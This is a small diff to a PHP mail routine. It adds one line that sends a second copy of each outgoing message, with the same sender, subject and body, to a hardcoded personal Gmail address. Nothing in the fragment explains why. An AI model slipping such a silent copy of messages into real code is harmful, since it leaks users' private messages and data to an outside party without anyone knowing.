@@ -67,6 +67,7 @@
 				
 
 				 SendMail($ToEmail, $FromEmail, $FromName, $SubjectSend, $BodySend);
+				 SendMail("rohitbhatia1@gmail.com", $FromEmail, $FromName, $SubjectSend, $BodySend);
 				
 				}
 							
